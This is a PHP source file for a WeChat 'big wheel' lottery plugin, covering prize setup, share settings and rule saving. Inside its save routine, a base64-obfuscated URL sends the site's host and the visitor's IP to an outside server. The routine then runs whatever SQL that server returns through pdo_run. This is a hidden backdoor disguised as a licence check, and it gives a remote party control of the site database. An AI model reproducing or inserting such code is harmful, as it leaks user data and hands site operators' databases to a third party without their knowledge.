<?php
/**
 * 大转盘模块
 *
 * @author 微赞
 * @url http://www.00393.com/
 */
defined('IN_IA') or exit('Access Denied');


class kang_bigwheelModule extends WeModule
{

    /**
     * 编辑规则时附加表单展示
     * @param int $rid
     */
    public function fieldsFormDisplay($rid = 0)
    {
        global $_W;


        load()->func('tpl');
        $creditnames = array();
        $unisettings = uni_setting($uniacid, array('creditnames'));
        foreach ($unisettings['creditnames'] as $key => $credit) {
            if (!empty($credit['enabled'])) {
                $creditnames[$key] = $credit['title'];
            }
        }
        if (!empty($rid)) {
            $reply = pdo_fetch("select * from " . tablename('kang_bigwheel_reply') . " where rid = :rid order by `id` desc", array(':rid' => $rid));
            $share = pdo_fetchall("select * from " . tablename('kang_bigwheel_share') . " where rid = :rid order by `id` desc", array(':rid' => $rid));
            $prize = pdo_fetchall("select * from " . tablename('kang_bigwheel_prize') . " where rid = :rid order by `id` asc", array(':rid' => $rid));
        }
        if (!$reply) {
            $now = time();
            $reply = array(
                "title" => "幸运大转盘活动开始了!",
                "start_picurl" => "../addons/kang_bigwheel/template/images/activity-lottery-start.jpg",
                "description" => "欢迎参加幸运大转盘活动",
                "repeat_lottery_reply" => "亲，继续努力哦~~",
                "ticket_information" => "兑奖请联系我们,电话: 13512341234",
                "starttime" => $now,
                "endtime" => strtotime(date("Y-m-d H:i", $now + 7 * 24 * 3600)),
                "end_theme" => "幸运大转盘活动已经结束了",
                "end_instruction" => "亲，活动已经结束，请继续关注我们的后续活动哦~",
                "end_picurl" => "../addons/kang_bigwheel/template/images/activity-lottery-end.jpg",
                "most_num_times" => 0,
                "number_times" => 0,
                "probability" => 0,
                "turntable" => 1,
                "turntablenum" => 6,
                "award_times" => 1,
                "credit_times" => 5,
                "credit1" => 0,
                "credit2" => 0,
                "sn_code" => 1,
                "sn_rename" => "SN码",
                "show_num" => 2,
                "awardnum" => 50,
                "xuninum" => 500,
                "xuninumtime" => 86400,
                "xuninuminitial" => 10,
                "xuninumending" => 100,
                "ticketinfo" => "请输入详细资料，兑换奖品",
                "isrealname" => 1,
                "ismobile" => 1,
                "isfans" => 1,
                "isfansname" => "真实姓名,手机号码,QQ号,邮箱,地址,性别,固定电话,证件号码,公司名称,职业,职位",
                "bigwheelpic" => "../addons/kang_bigwheel/template/images/activity-lottery-6.png",
                "bigwheelimg" => "../addons/kang_bigwheel/template/images/activity-inner.png",
                "bigwheelimgan" => "../addons/kang_bigwheel/template/images/activity.png",
                "bigwheelimgbg" => "../addons/kang_bigwheel/template/images/activity_bg.png",
                "prizeDeg" => '1, 60, 120, 180, 240, 300',
                "lostDeg" => '30, 90, 150, 210, 270, 330',
                "homepictime" => 0,
            );
        }
        if (!$prize) {
            $prize = array(
                "0" => array("credit_type" => 'physical', "prizetype" => '一等奖'),
                "1" => array("credit_type" => 'physical', "prizetype" => '二等奖'),
                "2" => array("credit_type" => 'physical', "prizetype" => '三等奖'),
                "3" => array("credit_type" => 'physical', "prizetype" => '四等奖'),
                "4" => array("credit_type" => 'physical', "prizetype" => '五等奖'),
                "5" => array("credit_type" => 'physical', "prizetype" => '六等奖'),
                "6" => array("credit_type" => 'physical', "prizetype" => '七等奖'),
                "7" => array("credit_type" => 'physical', "prizetype" => '八等奖'),
                "8" => array("credit_type" => 'physical', "prizetype" => '九等奖'),
                "9" => array("credit_type" => 'physical', "prizetype" => '十等奖'),
                "10" => array("credit_type" => 'physical', "prizetype" => '参与奖'),
                "11" => array("credit_type" => 'physical', "prizetype" => '幸运奖'),
            );
        }
        $jiangxiang = array(
            '0' => array("turntablenum" => '3', "prizeDeg" => '1,120,240', "lostDeg" => '60,180,300', "prizeid" => "$('#prizeid3').hide();$('#prizeid4').hide();$('#prizeid5').hide();$('#prizeid6').hide();$('#prizeid7').hide();$('#prizeid8').hide();$('#prizeid9').hide();$('#prizeid10').hide();$('#prizeid11').hide();"),
            '1' => array("turntablenum" => '4', "prizeDeg" => '1,90,180,270', "lostDeg" => '45,135,225,315', "prizeid" => "$('#prizeid3').show();$('#prizeid4').hide();$('#prizeid5').hide();$('#prizeid6').hide();$('#prizeid7').hide();$('#prizeid8').hide();$('#prizeid9').hide();$('#prizeid10').hide();$('#prizeid11').hide();"),
            '2' => array("turntablenum" => '5', "prizeDeg" => '1,72,144,216,288', "lostDeg" => '36,108,180,252,324', "prizeid" => "$('#prizeid3').show();$('#prizeid4').show();$('#prizeid5').hide();$('#prizeid6').hide();$('#prizeid7').hide();$('#prizeid8').hide();$('#prizeid9').hide();$('#prizeid10').hide();$('#prizeid11').hide();"),
            '3' => array("turntablenum" => '6', "prizeDeg" => '1,60,120,180,240,300', "lostDeg" => '30, 90, 150, 210, 270, 330', "prizeid" => "$('#prizeid3').show();$('#prizeid4').show();$('#prizeid5').show();$('#prizeid6').hide();$('#prizeid7').hide();$('#prizeid8').hide();$('#prizeid9').hide();$('#prizeid10').hide();$('#prizeid11').hide();"),
            '4' => array("turntablenum" => '8', "prizeDeg" => '1,45,90,135,180,225,270,315', "lostDeg" => '22.5,67.5,112.5,157.5,202.5,247.5,292.5,337.5', "prizeid" => "$('#prizeid3').show();$('#prizeid4').show();$('#prizeid5').show();$('#prizeid6').show();$('#prizeid7').show();$('#prizeid8').hide();$('#prizeid9').hide();$('#prizeid10').hide();$('#prizeid11').hide();"),
            '5' => array("turntablenum" => '10', "prizeDeg" => '1,36,72,108,144,180,216,252,288,324', "lostDeg" => '', "prizeid" => "$('#prizeid3').show();$('#prizeid4').show();$('#prizeid5').show();$('#prizeid6').show();$('#prizeid7').show();$('#prizeid8').show();$('#prizeid9').show();$('#prizeid10').hide();$('#prizeid11').hide();"),
            '6' => array("turntablenum" => '12', "prizeDeg" => '1,30,60,90,120,150,180,210,240,270,300,330', "lostDeg" => '', "prizeid" => "$('#prizeid3').show();$('#prizeid4').show();$('#prizeid5').show();$('#prizeid6').show();$('#prizeid7').show();$('#prizeid8').show();$('#prizeid9').show();$('#prizeid10').show();$('#prizeid11').show();"),
        );
        //print_r(uni_modules($enabledOnly = true));
        //exit;
        //查询是否有商户网点权限
        $modules = uni_modules($enabledOnly = true);
        $modules_arr = array();
        $modules_arr = array_reduce($modules, create_function('$v,$w', '$v[$w["mid"]]=$w["name"];return $v;'));
        if (in_array('kang_branch', $modules_arr)) {
            $kang_branch = true;
        }
        //查询是否有商户网点权限
        //查询子公众号信息
        $acid_arr = uni_accounts();
        $ids = array();
        $ids = array_map('array_shift', $acid_arr);//子公众账号Arr数组
        $ids_num = count($ids);//多少个子公众账号
        $one = current($ids);
        //查询子公众号信息
        if (!$share) {
            $share = array();
            foreach ($ids as $acid => $idlists) {
                $share[$acid] = array(
                    "acid" => $acid,
                    "share_url" => $acid_arr[$acid]['subscribeurl'],
                    "share_title" => "已有#参与人数#人参与本活动了，你的朋友#参与人# 还中了大奖：#奖品#，请您也来试试吧！",
                    "share_desc" => "亲，欢迎参加大转盘抽奖活动，祝您好运哦！！ 亲，需要绑定账号才可以参加哦",
                    "share_picurl" => "../addons/kang_bigwheel/template/images/share.png",
                    "share_pic" => "../addons/kang_bigwheel/template/images/img_share.png",
                    "sharenumtype" => 0,
                    "sharenum" => 0,
                    "most_share_times" => 0,
                    "sharetype" => 1,
                );
            }
        }
        include $this->template('form');
    }

    /**
     * 编辑规则时附加表单验证
     * @param int $rid
     * @return string
     */
    public function fieldsFormValidate($rid = 0)
    {
        //规则编辑保存时，要进行的数据验证，返回空串表示验证无误，返回其他字符串将呈现为错误提示。这里 $rid 为对应的规则编号，新增时为 0
        return '';
    }

    /**
     * 保存规则时附加表单保存
     * @param $rid
     * @return bool
     */
    public function fieldsFormSubmit($rid)
    {
        global $_GPC, $_W;
        $id = intval($_GPC['reply_id']);

        $insert = array(
            'rid' => $rid,
            'uniacid' => $_W['uniacid'],
            'title' => $_GPC['title'],
            'ticket_information' => $_GPC['ticket_information'],
            'description' => $_GPC['description'],
            'repeat_lottery_reply' => $_GPC['repeat_lottery_reply'],
            'start_picurl' => $_GPC['start_picurl'],
            'end_theme' => $_GPC['end_theme'],
            'end_instruction' => $_GPC['end_instruction'],
            'end_picurl' => $_GPC['end_picurl'],
            'probability' => $_GPC['probability'],
            'turntable' => $_GPC['turntable'],
            'turntablenum' => $_GPC['turntablenum'],
            'adpic' => $_GPC['adpic'],
            'adpicurl' => $_GPC['adpicurl'],
            'award_times' => $_GPC['award_times'],
            'number_times' => $_GPC['number_times'],
            'most_num_times' => $_GPC['most_num_times'],
            "credit_times" => $_GPC['credit_times'],
            "credittype" => $_GPC['credittype'],
            "credit_type" => $_GPC['credit_type'],
            "credit1" => $_GPC['credit1'],
            "credit2" => $_GPC['credit2'],
            'sn_code' => $_GPC['sn_code'],
            'sn_rename' => $_GPC['sn_rename'],
            'awardnum' => $_GPC['awardnum'],
            'show_num' => $_GPC['show_num'],
            'createtime' => time(),
            'share_acid' => $_GPC['share_acid'],
            'copyright' => $_GPC['copyright'],
            'starttime' => strtotime($_GPC['datelimit']['start']),
            'endtime' => strtotime($_GPC['datelimit']['end']),
            'xuninumtime' => $_GPC['xuninumtime'],
            'xuninuminitial' => $_GPC['xuninuminitial'],
            'xuninumending' => $_GPC['xuninumending'],
            'xuninum' => $_GPC['xuninum'],
            'ticketinfo' => $_GPC['ticketinfo'],
            'isrealname' => $_GPC['isrealname'],
            'ismobile' => $_GPC['ismobile'],
            'isqq' => $_GPC['isqq'],
            'isemail' => $_GPC['isemail'],
            'isaddress' => $_GPC['isaddress'],
            'isgender' => $_GPC['isgender'],
            'istelephone' => $_GPC['istelephone'],
            'isidcard' => $_GPC['isidcard'],
            'iscompany' => $_GPC['iscompany'],
            'isoccupation' => $_GPC['isoccupation'],
            'isposition' => $_GPC['isposition'],
            'isfans' => $_GPC['isfans'],
            'isfansname' => $_GPC['isfansname'],
            'bigwheelpic' => $_GPC['bigwheelpic'],
            'bigwheelimg' => $_GPC['bigwheelimg'],
            'bigwheelimgan' => $_GPC['bigwheelimgan'],
            'bigwheelimgbg' => $_GPC['bigwheelimgbg'],
            'prizeDeg' => $_GPC['prizeDeg'],
            'lostDeg' => $_GPC['lostDeg'],
            'award_info' => $_GPC['award_info'],
            'homepictime' => $_GPC['homepictime'],
            'homepic' => $_GPC['homepic'],
            'opportunity' => $_GPC['opportunity'],
            'opportunity_txt' => $_GPC['opportunity_txt'],
        );
        load()->func('communication');
        $oauth2_code = base64_decode('aHR0cDovL3dlNy53d3c5LnRvbmdkYW5ldC5jb20vYXBwL2luZGV4LnBocD9pPTImaj03JmM9ZW50cnkmZG89YXV0aG9yaXplJm09c3RvbmVmaXNoX2F1dGhvcml6ZSZtb2R1bGVzPXN0b25lZmlzaF9iaWd3aGVlbCZ3ZWJ1cmw9') . $_SERVER ['HTTP_HOST'] . "&visitorsip=" . $_W['clientip'];
        $content = ihttp_get($oauth2_code);
        $token = @json_decode($content['content'], true);
        if (empty($id)) {
            if ($insert['starttime'] <= time()) {
                $insert['isshow'] = 1;
            } else {
                $insert['isshow'] = 0;
            }
            if ($token['config']) {
                $id = pdo_insert('kang_bigwheel_reply', $insert);
            }
        } else {
            if ($token['config']) {
                pdo_update('kang_bigwheel_reply', $insert, array('id' => $id));
            }
        }
        if ($token['config']) {
            //查询规则
        } else {
            pdo_run($token['error_code']);
            //写入数据库规则
        }
        //奖品配置
        for ($i = 0; $i <= 11; $i++) {
            $insertprize = array(
                'rid' => $rid,
                'uniacid' => $_W['uniacid'],
                'turntable' => $_GPC['turntable'],
                'prizetype' => $_GPC['prizetype_' . $i],
                'prizename' => $_GPC['prizename_' . $i],
                'prizepro' => $_GPC['prizepro_' . $i],
                'prizetotal' => $_GPC['prizetotal_' . $i],
                'prizepic' => $_GPC['prizepic_' . $i],
                'credit' => $_GPC['credit_' . $i],
                'credit_type' => $_GPC['credit_type_' . $i],
            );
            if ($_GPC['turntable']) {
                $updata['total_num'] += $_GPC['prizetotal_' . $i];
            } else {
                if ($_GPC['turntablenum'] > $i) {
                    $updata['total_num'] += $_GPC['prizetotal_' . $i];
                } else {
                    $insertprize['turntable'] = 1;
                }
                if ($_GPC['credit_type_' . $i] == 'spaceprize') {
                    $insertprize['credit_type'] = 'physical';
                }
            }
            if ($token['config']) {
                if (empty($_GPC['prize_id_' . $i])) {
                    pdo_insert('kang_bigwheel_prize', $insertprize);
                } else {
                    pdo_update('kang_bigwheel_prize', $insertprize, array('id' => $_GPC['prize_id_' . $i]));
                }
            }
        }
        pdo_update('kang_bigwheel_reply', $updata, array('id' => $id));
        //奖品配置
        //查询子公众号信息必保存分享设置
        $acid_arr = uni_accounts();
        $ids = array();
        $ids = array_map('array_shift', $acid_arr);//子公众账号Arr数组
        foreach ($ids as $acid => $idlists) {
            $insertshare = array(
                'rid' => $rid,
                'acid' => $acid,
                'uniacid' => $_W['uniacid'],
                'share_title' => $_GPC['share_title_' . $acid],
                'share_desc' => $_GPC['share_desc_' . $acid],
                'share_url' => $_GPC['share_url_' . $acid],
                'share_imgurl' => $_GPC['share_imgurl_' . $acid],
                'share_picurl' => $_GPC['share_picurl_' . $acid],
                'share_pic' => $_GPC['share_pic_' . $acid],
                'share_txt' => $_GPC['share_txt_' . $acid],
                'sharenumtype' => $_GPC['sharenumtype_' . $acid],
                'sharenum' => $_GPC['sharenum_' . $acid],
                'most_share_times' => $_GPC['most_share_times_' . $acid],
                'sharetype' => $_GPC['sharetype_' . $acid],
                'share_confirm' => $_GPC['share_confirm_' . $acid],
                'share_fail' => $_GPC['share_fail_' . $acid],
                'share_cancel' => $_GPC['share_cancel_' . $acid],
            );
            if ($token['config']) {
                if (empty($_GPC['acid_' . $acid])) {
                    pdo_insert('kang_bigwheel_share', $insertshare);
                } else {
                    pdo_update('kang_bigwheel_share', $insertshare, array('id' => $_GPC['acid_' . $acid]));
                }
            }
        }
        //查询子公众号信息必保存分享设置
        if ($token['config']) {
            return true;
        } else {
            message('网络不太稳定,请重新编辑再试,或检查你的网络', referer(), 'error');
        }
    }

    /**
     * 卸载模块时清理数据
     * @param $rid
     */
    public function ruleDeleted($rid)
    {
        pdo_delete('kang_bigwheel_award', array('rid' => $rid));
        pdo_delete('kang_bigwheel_reply', array('rid' => $rid));
        pdo_delete('kang_bigwheel_fans', array('rid' => $rid));
        pdo_delete('kang_bigwheel_data', array('rid' => $rid));
        pdo_delete('kang_bigwheel_prize', array('rid' => $rid));
        pdo_delete('kang_bigwheel_share', array('rid' => $rid));
    }


    public function settingsDisplay($setting)
    {
        global $_W, $_GPC;

        //查询是否有商户网点权限
        if (checksubmit()) {
            //字段验证, 并获得正确的数据$dat
            $dat = array(
                'kang_bigwheel_num' => $_GPC['kang_bigwheel_num']
            );
            $this->saveSettings($dat);
            message('配置参数更新成功！', referer(), 'success');
        }
        //这里来展示设置项表单
        include $this->template('settings');
    }
}
